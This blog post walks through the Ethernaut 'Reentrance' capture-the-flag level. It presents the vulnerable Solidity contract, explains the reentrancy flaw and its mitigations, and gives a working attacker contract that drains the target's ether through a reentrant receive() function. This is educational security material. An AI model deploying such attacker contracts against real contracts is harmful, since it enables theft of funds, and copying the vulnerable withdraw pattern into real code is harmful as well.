########################
Ethernaut 10: Reentrance
########################
:slug: ethernaut-10-reentrance
:date: 2023-07-30
:summary: They're getting less trivial, so let's do one per post so it stays
          readable.
:tags: programming
:author: capu
:featured_image:


Objective
=========
Steal the contract's ether

Code
====

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 20 22 24

    contract Reentrance {
        mapping(address => uint256) public balances;

        function donate(address _to) public payable {
            balances[_to] += msg.value;
        }

        function balanceOf(address _who)
            public view returns (uint256 balance) {
            return balances[_who];
        }

        function withdraw(uint256 _amount) public {
            // We updated this with unchecked so it behaves
            // as per the original code written to be
            // compiled with solidity ^0.6.0 As of ^0.8.0,
            // arithmetic ops will revert on over/underflow
            // On ^0.6.0, it will wrap
            unchecked {
                if (balances[msg.sender] >= _amount) {
                    (bool result,) = msg.sender
                        .call{value: _amount}("");
                    if (result) { _amount; }
                    balances[msg.sender] -= _amount;
                }
            }
        }

        receive() external payable {}
    }

Solution
========
This contract is vulnerable to a reentrancy attack, as the name says 🙃.
and it works as follows:

1. A contract with some balance calls the ``withdraw`` method with a valid
   amount
2. The check on line 20 passes
3. The ``Reentrance`` contract transfers ether to the attacker
4. The attacker's balance hasn't been updated yet
5. This runs the attacker's fallback function
6. The attacker's fallback function calls the ``withdraw`` method again, with
   the same amount.
7. The cycle repeats from step 1.
8. At some point, the attacker decides to stop doing reentrant calls and simply
   returns. Otherwise, it'd spend all the available gas and revert the
   transaction.
9. Since overflows aren't checked, line 24 doesn't revert the transaction
10. All the call frames return and the attacker walks away with all of the
    contract's ether.

This attack it's possible because several mitigations are skipped:

- plenty of gas is forwarded to the withdrawer (although not doing so is `not a
  good mitigation
  <https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>`_),
  so an attacker can call back to the ``Reentrance`` contract.
- subtracting ``_amount`` from the caller's balance is done *after* the
  potentially-reentrant call. If it were done *before*, then the first reentrant
  call wouldn't get into the ``if`` in line 20. This mitigation is called
  `Checks-Effects-Interactions
  <https://docs.soliditylang.org/en/latest/security-considerations.html>`_
  pattern. 
- The subtraction in line 24 is allowed to fail silently. Otherwise, the
  transaction would revert and no funds would be stolen.


.. code-block:: solidity
    :linenos: inline

    function solution(address payable target_) internal override{
        Reentrance target = Reentrance(target_);
        Reentrooor reentrooor = new Reentrooor(target);
        reentrooor.deposit{value: 0.001 ether}();
        reentrooor.attack();
    }

.. code-block:: solidity
    :linenos: inline
    :hl_lines: 17

    contract Reentrooor {
        Reentrance private target;
        uint256 private calls = 0;
        constructor(Reentrance _target) {
            target = _target;
        }

        function deposit() public payable {
            target.donate{value: msg.value}(address(this));
        }
        function attack() public {
            target.withdraw(0.001 ether);
        }

        receive() external payable {
            if(calls++ > 2) return;
            target.withdraw(0.001 ether);
        }
    }

😎

Would you find this more fun as a livestream? I think it'd be more fun to see me
try all the wrong solutions than to read a lecture on how a level is solved.

See you next week!
